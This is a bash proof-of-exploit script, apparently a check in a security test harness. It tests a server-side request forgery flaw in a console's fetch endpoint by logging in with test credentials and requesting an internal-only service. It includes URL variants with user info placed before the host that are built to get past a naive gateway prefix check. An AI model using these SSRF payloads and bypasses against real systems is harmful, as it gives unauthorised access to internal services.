#!/usr/bin/env bash
set -euo pipefail
# LG-SSRF-001 proof-of-exploit: server-side request forgery in the console upstream-preview endpoint.
# Signs on for a real session, then asks the console to fetch an internal-only service by its
# in-cluster name (http://fortran:8080/healthz), an address the attacker's host cannot resolve and
# that is not the gateway. Fires (exit 0) when the console returns that service's response ("ok"),
# proving it made the request on the caller's behalf -- only possible with partner_preview=on.
# Also tries URLs that pass a naive gateway prefix check but name another host (user info before
# the host), so a weak gateway check fires this under baseline too. With the fix the origin check
# rejects every variant (403). Hits the console directly. Env: PASCAL_URL (:8085),
# SSRF_TARGET (default http://fortran:8080/healthz).

PASCAL_URL="${PASCAL_URL:-http://localhost:8085}"
SSRF_TARGET="${SSRF_TARGET:-http://fortran:8080/healthz}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

curl -sS -c "$JAR" -X POST "$PASCAL_URL/login" \
  --data-urlencode 'staff_id=TLR001' --data-urlencode 'password=teller-pw' >/dev/null

target_rest="${SSRF_TARGET#http://}"
for url in "$SSRF_TARGET" "http://gateway:8080@$target_rest" "http://gateway:8080\\@$target_rest"; do
  resp="$(curl -sS -b "$JAR" -G "$PASCAL_URL/fetch" --data-urlencode "url=$url")"
  if [ "$(printf '%s' "$resp" | tr -d '[:space:]')" = "ok" ]; then
    echo "LG-SSRF-001 FIRED: console fetched internal-only $SSRF_TARGET via url=$url -> '$resp'"
    exit 0
  fi
done
echo "LG-SSRF-001 not fired: $(printf '%s' "$resp" | head -c 200)" >&2
exit 1
